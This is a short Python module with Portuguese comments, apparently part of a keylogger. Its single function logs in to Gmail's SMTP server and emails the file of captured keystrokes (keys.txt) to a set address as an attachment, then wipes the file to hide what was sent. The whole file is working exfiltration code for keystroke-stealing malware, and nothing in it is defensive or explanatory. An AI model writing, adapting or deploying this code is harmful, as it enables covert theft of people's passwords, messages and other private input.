#Imports do Email
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

#Iniciando variáveis para o email
email_from = "emailRemetente"
email_to = "emailDestinatario"
smtp = "smtp.gmail.com"

#Função para enviar as keys
def send_keys():
    #Inciando o server SMTP e logando com o e-mail destinatário
    server = smtplib.SMTP(smtp,587)
    server.starttls()
    server.login(email_from,open('password.txt').read().strip())

    #Criando a mensagem que será enviada
    msg = MIMEMultipart()
    msg['Subject'] = 'Teclas Capturadas'
    msg['From'] = email_from
    msg['To'] = email_to
    body = "<b>As seguintes teclas foram registradas:</b>"
    msg.attach(MIMEText(body, 'html'))

    #Codificando o arquivo com as teclas em base64
    filename = "keys.txt"
    attachment = open(filename, 'rb')
    att = MIMEBase('application', 'octet-stream')
    att.set_payload(attachment.read())
    encoders.encode_base64(att)
    att.add_header('Content-Disposition', f'attachment;filename = keys.txt')
    attachment.close()
    #Anexando o arquivo codificado no e-mail
    msg.attach(att)

    #Enviando o e-mail e fechando o server
    server.sendmail(email_from, email_to, str(msg))
    server.quit()

    #Limpando o arquivo com os dados já enviados
    file = open("keys.txt","r+")
    file.truncate(0)
    file.close()